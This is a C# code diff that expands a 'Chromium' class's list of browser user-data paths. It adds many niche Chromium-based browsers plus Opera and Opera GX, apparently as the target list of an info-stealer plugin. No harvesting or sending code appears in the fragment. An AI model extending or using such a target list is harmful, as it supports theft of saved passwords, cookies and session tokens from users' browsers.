@@ -153,28 +153,44 @@ namespace Plugin
 
     public class Chromium
     {
-        private static string appdata = Environment.GetEnvironmentVariable("LOCALAPPDATA");
+        private static string local_appdata = Environment.GetEnvironmentVariable("LOCALAPPDATA");
+        private static string roaming_appdata = Environment.GetEnvironmentVariable("APPDATA");
 
-        private Dictionary<string, string> browsers = new Dictionary<string, string>
-    {
-        { "amigo", $"{appdata}\\Amigo\\User Data" },
-        { "torch", $"{appdata}\\Torch\\User Data" },
-        { "kometa", $"{appdata}\\Kometa\\User Data" },
-        { "orbitum", $"{appdata}\\Orbitum\\User Data" },
-        { "cent-browser", $"{appdata}\\CentBrowser\\User Data" },
-        { "7star", $"{appdata}\\7Star\\7Star\\User Data" },
-        { "sputnik", $"{appdata}\\Sputnik\\Sputnik\\User Data" },
-        { "vivaldi", $"{appdata}\\Vivaldi\\User Data" },
-        { "google-chrome-sxs", $"{appdata}\\Google\\Chrome SxS\\User Data" },
-        { "google-chrome", $"{appdata}\\Google\\Chrome\\User Data" },
-        { "epic-privacy-browser", $"{appdata}\\Epic Privacy Browser\\User Data" },
-        { "microsoft-edge", $"{appdata}\\Microsoft\\Edge\\User Data" },
-        { "uran", $"{appdata}\\uCozMedia\\Uran\\User Data" },
-        { "yandex", $"{appdata}\\Yandex\\YandexBrowser\\User Data" },
-        { "brave", $"{appdata}\\BraveSoftware\\Brave-Browser\\User Data" },
-        { "iridium", $"{appdata}\\Iridium\\User Data" },
-    };
+        public static Dictionary<string, string> browsers = new Dictionary<string, string>
+        {
+            { "amigo", $"{local_appdata}\\Amigo\\User Data" },
+            { "torch", $"{local_appdata}\\Torch\\User Data" },
+            { "kometa", $"{local_appdata}\\Kometa\\User Data" },
+            { "orbitum", $"{local_appdata}\\Orbitum\\User Data" },
+            { "cent-browser", $"{local_appdata}\\CentBrowser\\User Data" },
+            { "7star", $"{local_appdata}\\7Star\\7Star\\User Data" },
+            { "sputnik", $"{local_appdata}\\Sputnik\\Sputnik\\User Data" },
+            { "vivaldi", $"{local_appdata}\\Vivaldi\\User Data" },
+            { "google-chrome-sxs", $"{local_appdata}\\Google\\Chrome SxS\\User Data" },
+            { "google-chrome", $"{local_appdata}\\Google\\Chrome\\User Data" },
+            { "epic-privacy-browser", $"{local_appdata}\\Epic Privacy Browser\\User Data" },
+            { "microsoft-edge", $"{local_appdata}\\Microsoft\\Edge\\User Data" },
+            { "uran", $"{local_appdata}\\uCozMedia\\Uran\\User Data" },
+            { "yandex", $"{local_appdata}\\Yandex\\YandexBrowser\\User Data" },
+            { "brave", $"{local_appdata}\\BraveSoftware\\Brave-Browser\\User Data" },
+            { "iridium", $"{local_appdata}\\Iridium\\User Data" },
+            { "chromium", $"{local_appdata}\\Chromium\\User Data" },
+            { "qqbrowser", $"{local_appdata}\\Tencent\\QQBrowser\\User Data" },
+            { "chromeplus", $"{local_appdata}\\ChromePlus\\User Data" },
+            { "chedot", $"{local_appdata}\\Chedot\\User Data" },
+            { "coowon", $"{local_appdata}\\Coowon\\User Data" },
+            { "liebao", $"{local_appdata}\\Cheetah Mobile\\Liebao Browser\\User Data" },
+            { "qip-surf", $"{local_appdata}\\QIP\\Surf\\User Data" },
+            { "comodo", $"{local_appdata}\\Comodo\\Dragon\\User Data" },
+            { "360browser", $"{local_appdata}\\360SE\\User Data" },
+            { "maxthon3", $"{local_appdata}\\Maxthon3\\User Data" },
+            { "coccoc", $"{local_appdata}\\CocCoc\\Browser\\User Data" },
+            { "chromodo", $"{local_appdata}\\Comodo\\Chromodo\\User Data" },
+            { "blackhawk", $"{local_appdata}\\Netgate\\BlackHawk\\User Data" },
 
+            { "opera", $"{roaming_appdata}\\Opera Software\\Opera Stable" },
+            { "opera-gx", $"{roaming_appdata}\\Opera Software\\Opera GX Stable" }
+        };
 
         private string[] profiles = {
         "Default",
